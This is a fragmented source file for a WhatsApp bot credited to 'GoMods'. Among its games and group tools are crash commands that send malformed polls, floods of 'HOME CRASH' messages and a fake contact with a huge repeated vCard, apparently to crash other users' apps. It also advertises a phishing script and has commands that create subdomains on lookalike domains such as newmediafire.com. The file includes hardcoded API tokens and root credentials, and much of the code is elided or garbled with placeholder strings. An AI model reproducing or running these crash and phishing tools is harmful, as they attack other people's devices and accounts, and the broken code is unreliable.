/**
   * Create By GoMods.
   * Contact 6285778852160
   * Github https://github.com/GoMods
*/
...
"fileName": `𝐆𝐨 〩 𝐌𝐨𝐝𝐬${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}
//=================================================//
const bangkal= (teks) => {
haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `Script 𝐆𝐨 〩 𝐌𝐨𝐝𝐬`,"body": `Welcome ${salam} ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://i.ibb.co/fnrdbsh/dark.png`}}}, { quoted: hw })
} 
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `Script 𝐆𝐨 〩 𝐌𝐨𝐝𝐬`,"body": `Welcome ${salam} ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://i.ibb.co/fnrdbsh/dark.png`}}}, { quoted: hw })
} 
//=================================================//
const deploy = (teks) => {
...
haikal.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} DarkGo`, m)
...
haikal.sendText(m.chat, `DarkGo

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

DarkGo https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) haikal.sendText(roof.p, `DarkGo \n\nDarkGo\nDarkGo\nDarkGo`, m)
if (!roof.pilih2) haikal.sendText(roof.p2, `DarkGo \n\nDarkGo\nDarkGo\DarkGo️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) haikal.sendText(m.chat, `DarkGo`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
haikal.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} DarkGo`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
...
roof.text = m.text
bangkal(`DarkGo ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) haikal.sendText(roof.p2, '_DarkGo_\DarkGo', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
bangkal(`DarkGo ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) haikal.sendText(roof.p, 'DarkGo_\DarkGo', 0)
}
...
haikal.sendText(roof.asal, `_*DarkGo*_${tie ? '\nSERI' : ''}
@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` DarkGo \n` : ` DarkGo \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` DarkGo \n` : ` DarkGo \n`}
...
bangkal(`
DarkGo ${reason ? 'DarkGo' + reason : 'DarkGo'}
...
let user = global.db.data.users[m.sender]
bangkal(`
Hello Saya Bot Hw Mods${user.afkReason ? ' DarkGo ' + user.afkReason : ''}
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `Copyright © 𝐆𝐨 〩 𝐌𝐨𝐝𝐬${ngazap(prefix)}`,
"jpegThumbnail": mekih,
"orderTitle": `Copyright © 𝐆𝐨 〩 𝐌𝐨𝐝𝐬${ngazap(prefix)}`,
...
"mimetype": "image/jpeg",
"caption": `Copyright © GoMods${ngazap(prefix)}`,
...
"fileName": `Copyright © GoMods${ngazap(prefix)}`,
...
"title": `Copyright © 𝐆𝐨 〩 𝐌𝐨𝐝𝐬${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: doc })
...
"extendedTextMessage": {
"text": "https://wa.me",
"matchedText": "https://wa.me",
"description": "Developer 𝐆𝐨 〩 𝐌𝐨𝐝𝐬\nWhatsApp / Script Botz \n\nOrder Chat 👋",
"title": `Copyright © 𝐆𝐨 〩 𝐌𝐨𝐝𝐬${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
...
"caption": `Copyright © 𝐆𝐨 〩 𝐌𝐨𝐝𝐬${ngazap(prefix)}`,
...
"inviteExpiration": `MY 𝐆𝐨 〩 𝐌𝐨𝐝𝐬${ngazap(prefix)}`,
"groupName": `Copyright © 𝐆𝐨 〩 𝐌𝐨𝐝𝐬${ngazap(prefix)}`,
...
"title": `Copyright © 𝐆𝐨 〩 𝐌𝐨𝐝𝐬${ngazap(prefix)}`,
"description": `Copyright © GoMods`,
"jpegThumbnail": mekih,
"currencyCode": "IDR",
"footerText": `Copyright © 𝐆𝐨 〩 𝐌𝐨𝐝𝐬`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `Copyright © 𝐆𝐨 〩 𝐌𝐨𝐝𝐬`,
...
"pollCreationMessage": {
"name": "CRASH 👋 𝐆𝐨 〩 𝐌𝐨𝐝𝐬",
"options": [
	{
"optionName": "v1HOME CRASH"
	},
	{
"optionName": "v2HOME CRASH"
	},
	{
"optionName": "v3HOME CRASH"
	},
	{
"optionName": "v4HOME CRASH"
	},
	{
"optionName": "v5HOME CRASH"
	}
],
...
if (args.length < 1) return reply(`*Syntax Error*\n\nUse : ${command} Number|Amount|Timer\nExample : ${command} 62XXX@g.us|1|10s\n\n\ns = Second\n\nGoMods`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
...
"productId": "449756950375071",
"title": `Copyright © 𝐆𝐨 〩 𝐌𝐨𝐝𝐬${ngazap(prefix)}`,
"description": `Copyright © 𝐆𝐨 〩 𝐌𝐨𝐝𝐬`,
"currencyCode": "IDR",
"footerText": `Copyright © 𝐆𝐨 〩 𝐌𝐨𝐝𝐬`,
"productImageCount": 1,
"firstImageId": 1,
...
haikal.sendMessage(Pe, {text: "HOME CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "HOME CRASH"}, {quoted: doc})
await sleep(20)
haikal.sendMessage(Pe, {text: "HOME CRASH"}, {quoted: doc})
...
user.afkReason = text
deploy(`${m.pushName} Crash${text ? ': ' + text : ''}`)
}
break
//=================================================//
case 'bugstik':{
...
m.reply(`*Success Send* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
for (let yoi of anu) {
await sleep(1500)
...
haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `𝐆𝐨 〩 𝐌𝐨𝐝𝐬 ${ngazap(prefix)}.BIN`, title: `DarkGo メ ${ngazap(prefix)}.BIN` }, { quoted: doc })
}
break
//=================================================//
case 'bugtod': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `Copyright © GoMods${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:Go Mods\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
...
haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Done` }, { quoted: doc })
}
break
...
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By GoMods`}, { quoted : doc})
}
break
//=================================================//
case 'jadibug3': {
...
if (!/webp/.test(mime)) throw `Reply Image Caption *${prefix + command}*`
...
if (!coded) return m.reply("Link Fail")
haikal.query({
tag: "iq",
attrs: {
type: "get",
...
▸ Create: ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
...
haikal.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Done"}, {quoted:m})
break
//=================================================//
case 'asupanukhty':
case 'asupan-ukhty':
...
if (args[0] === "add") {
if (isBane) return reply('*User Has Banned*')
banned.push(orgnye)
reply(`Success Add Banned User`)
} else if (args[0] === "del") {
if (!isBane) return reply('*GoMods*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
reply(`*Success Removing Banned User*`)
} else {
reply("Error")
}
}
...
case 'searchgroups':
if (isBan) throw sticBanLu(from)
if (!q) return reply(`Example: ${prefix}searchgroups hackers`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WhatsApp Link* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
reply(res)
...
haikal.sendMessage(m.chat, { image: anu, caption: `Done` }, { quoted: m})
}
break
//=================================================//
...
haikal.sendMessage(m.chat, { image: anu, caption: `Done` }, { quoted: m}).catch((err) => m.reply('Done'))
}
break
//=================================================//
case 'meme':{
...
if (!q) return reply(`Use ${command} text\n\nExample : ${command} Done`)
const apa = ['Done', 'Done', 'Done Done', 'Done']
const kah = apa[Math.floor(Math.random() * apa.length)]
haikal.sendMessage(from, { text: `Done ${q}\nDone ${kah}` }, { quoted: hw })
break
//=================================================//
case 'bisakah':
if (isBan) throw sticBanLu(from)
...
if (!q) return reply(`Use ${command} text\n\nExample : ${command} Done`)
const bisa = ['Done','Done Done','Done Done Done Done','Done Done Done Done']
...
if (!q) return reply(`Use ${command} text\n\nExample : ${command} Done`)
const gimana = ['Done', 'Done', 'Done', 'Done','Done','Done','Done','Done','Done']
...
haikal.sendMessage(from, { text: `Done ${q}\Done *${te}%*` }, { quoted: hw })
break
//=================================================//
case 'gantengcek':
case 'cekganteng':
...
if (!q) return reply(`Use ${command} Name\n\nExample : ${command} GoMods`)
...
haikal.sendMessage(from, { text: `Done ${q}\nDone *${sange}%*` }, { quoted: hw })
break
//=================================================//
case 'kapankah':
if (isBan) throw sticBanLu(from)

if (!q) return reply(`Use ${command} Done\n\nExample : ${command} Done`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Done ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
haikal.sendMessage(from, { text: `Done ${q}\nDone *${kapankah}*` }, { quoted: hw })
break
//=================================================//
case 'wangy':
if (isBan) throw sticBanLu(from)

if (!q) return reply (`Example : wangy GoMods`)
qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} Done ${qq} Done ${qq} Done ${qq} Done ${qq} Done ${qq} Done ${qq} Done ${qq} Done ${qq} Done ${qq} Done ${q} Done ${qq} Done ${qq} Done`
 reply(awikwok)
break
//=================================================//
case 'cekmati':
...
if (this.game) {
delete this.game
haikal.sendText(m.chat, `Success`, m)
} else if (!this.game) {
reply(`Success`)
} else throw '?'
} catch (e) {
...
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Success`)
if (m.mentionedJid[0] === m.sender) return reply(`Success`)
if (!m.mentionedJid[0]) return reply(`_Success_\nSuccess\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Success`
...
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) haikal.sendText(m.chat, `Success_`, m)
delete this.suit[id]
...
case 'donasi': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/fnrdbsh/dark.png' }, caption: `*Welcome ${m.pushName}*\n\n Price\n⭔ 10k 1 Month\n⭔ 15k 2 Month\n\n Premium Price Botz\n⭔ 20k\n\nPayment GoPay Dana Ovo\n\nFor More Details You Can Chat With The Owner\nGoMods (Owner)\n\nDonate For Me : \n\n⭔ Paypal : https://trakteer.id\n⭔ Saweria : https://saweria.co` }, { quoted: hw })
}
break
//=================================================//
case 'scriptbotz': {
...
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Fail'
...
} catch { m.reply('Fail Change Photo Profile') }
}
break
...
if (!isAdmins) throw sticAdmin(from)
if (args[0] === 'close'){
await haikal.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Success`)).catch((err) => reply(jsonformat(err)))
} 
}
break
//=================================================//
...
if (!isAdmins) throw sticAdmin(from)
 if (args[0] === 'open'){
await haikal.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Success Membuka Edit Info Grub`)).catch((err) => reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await haikal.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Success Menutup Edit Info Grub`)).catch((err) => reply(jsonformat(err)))
 } 
}
break
//=================================================//
...
if (!isAdmins) throw sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].mute) return reply(`Udah Active`)
db.data.chats[m.chat].mute = true
reply(`${haikal.user.name} Telah Mute`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].mute) return reply(`Tidak Active`)
db.data.chats[m.chat].mute = false
reply(`${haikal.user.name} Telah Un Mute`)
} 
 }
 break
//=================================================//
...
if (isBan) throw sticBanLu(from)
 ...
 let teks = `⬣ *LIST GRUB CHAT*\n\nTotal Grub : ${anu.length} Grub\n\n`
 for (let i of anu) {
...
if (args[0] === "add") {
if (isCwner) return m.reply('Done')
owner.push(orgnye)
m.reply(`Succes add friends`)
} else if (args[0] === "del") {
if (!isCwner) return m.reply('Fail')
...
haikal.sendMessage(from, {text:"Reply Text"}, {quoted:m})
}
}
break
//=================================================//
...
let zone1 = "NEvgpIL72mr6nPlHXPrV66LfwRm2Vr91V27_ksMc"; // ZONE ID
let apiToken1 = "NEvgpIL72mr6nPlHXPrV66LfwRm2Vr91V27_ksMc"; // API TOKEN
let tld1 = "newmediafire.com"; // DOMAIN
axios
.post(
...
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host1) return m.reply("Error");
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "IP Error" : "IP");
subDomain1(host1, ip1).then((e) => {
if (e['success']) m.reply(`Success Add Subdomain\nip: ${e['ip']}\nName: ${e['name']}`);
else m.reply(`Error Create Subbdomain\nMsg: ${e['error']}`)
});
break
//=================================================//
case 'subdomain2':
...
let zone1 = "NEvgpIL72mr6nPlHXPrV66LfwRm2Vr91V27_ksMc"; // ZONE ID
let apiToken1 = "NEvgpIL72mr6nPlHXPrV66LfwRm2Vr91V27_ksMc"; // API TOKEN
let tld1 = "viralterbaru.com"; // DOMAIN
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone1}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld1, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
...
//=================================================//
case 'addpackage':
let sUser1 = "root"; // DEFAULT
let sPass1 = "password"; // PASSWORD
let serverName1 = "DOMAIN"; // LOGIN SERVER
let uname1 = args?.join(" ")?.trim()?.split("|")?.[0]?.trim();
let pack1 = args?.join(" ")?.trim()?.split("|")?.[1]?.trim();
if (!uname1 || !pack1) return m.reply(`Dark ${!uname1 && !pack1 ? "username & package" : !uname1 ? "username" : !pack1 ? "package" : ""} Go\n\nusage: .addpackage Username | Package`);
axios
...
if(!pkgs.includes(pack1)) return m.reply(`Package ${pack1} Not Found\nPackage Available:\n- ${pkgs.join("\n- ")}`)
axios
...
return pack1. 
  toLowerCase().includes("whm") ? x.toLowerCase().includes("cpanel") : pack1.toLowerCase().includes("admin") ? x.toLowerCase().includes("whm") || x.toLowerCase().includes("cpanel") : pack1.toLowerCase().includes("ceo") ? !x.toLowerCase().includes("ceo") && !x.toLowerCase().includes("founder") : pack1.toLowerCase().includes("founder") ? true : false;
});
...
axios
.get(`https://${serverName1}/json-api/setresellerlimits?api.version=1&user=${uname1}&${param}`, { headers: { Authorization: "Basic " + Buffer.from(sUser1 + ":" + sPass1).toString("base64") } }).then(async (e) => {
if (e?.data?.metadata?.reason == "OK") {
let pkgDone = [];
for await (let pkg of allowedPkg) {
console.log(`Addpackage ${pkg} To ${uname1}`); await 
axios
...
console.log({ error: `Addpackage: ${pkg} To User: ${uname1}`, msg: JSON.stringify(e.data?.metadata?.reason || e.data?.metadata || e.data, null, 2) });
}
})
.catch((e) => {
...
if (pkgDone.length > 0) m.reply(`Addpackage Success\nList Package For Add:\n- ${pkgDone.join("\n- ")}`);
} else console.log(`Upgrade User ${uname1} To ${pack1} Error\nError: ${JSON.stringify(e.data || e, null, 2)}`);
});
}
} else {
...
axios.get(`https://${serverName1}:2087/json-api/removeacct?api.version=1&username=${uname}`, { headers: { Authorization: "Basic " + Buffer.from("root:password").toString("base64") } })
.then(e=>{if([1, "1"].includes(e.data?.metadata?.result)) m.reply(`Success ${uname} Termint`); else {m.reply("error"); console.log(e.data)}})
.catch(e=>{m.reply("error"); console.log(JSON.stringify(e, null, 2))})
break
//=================================================//
case 'scriptphising':
m.reply(`Script Phising\nDownload : https://mediafire.com`)
break
//=================================================//
case 'listsubdomain':{
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
title: `List Subdomain`,
description: "WARNING",
buttonText: "CLICK HERE",
footerText: "SELECT SUBDOMAIN",
listType: "SINGLE_SELECT",
sections: [{
"title": "List Subdomain",
"rows": [
{
"title": "List Subdomain 1",
"description": "newmediafire.com",
"rowId": `${prefix}List Subdomain`
}
]
},
{
"title": "List Subdomain 2",
"description": "terbaru.com",
"rowId": `${prefix}List Subdomain`
}
]
},
{
"title": "List Subdomain 3",
"description": "viralterbaru.com",
"rowId": `${prefix}List Subdomain`
}
]
},
...
"extendedTextMessage": {
